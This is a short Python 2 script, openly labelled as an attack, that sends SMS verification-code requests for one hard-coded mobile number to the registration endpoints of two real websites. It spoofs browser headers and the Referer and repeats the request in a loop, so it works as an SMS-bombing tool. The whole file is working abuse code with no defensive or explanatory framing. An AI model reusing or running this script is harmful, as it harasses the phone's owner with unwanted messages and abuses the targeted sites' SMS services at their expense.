#!/usr/bin/env python
# -*- coding: utf-8 -*-

import httplib, urllib, sys, os, re, urllib2
import string

url = 'http://d.fcyun.com//register/getcode?rand=0.5558077982148903&submit_token=undefined'
# 请求的数据
payload = {'receiveMobileNo': '15951611383'}
# 注意Referer不能为空
i_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
             "Accept": "application/json, text/javascript, */*; q=0.01",
             'Referer': 'http://d.fcyun.com/register?dyzc2'}

url = 'http://www.jc258.cn/signup/send_sms'
# 请求的数据
payload = {'mobile': '15951611383', "type": "register"}
# 注意Referer不能为空
i_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
             "Accept": "*/*",
             'Referer': 'http://www.jc258.cn/signup'}

def attack(url=url, payload=payload, i_headers=i_headers):

    payload = urllib.urlencode(payload)

    try:
        request = urllib2.Request(url, payload, i_headers)
        response = urllib2.urlopen(request)
        datas = response.read()
        print datas.decode('utf-8')
        print 'attack success!!!'
    except Exception, e:
        print e
        print "attack failed!!!"


if __name__ == "__main__":
    for i in range(5):
        attack()
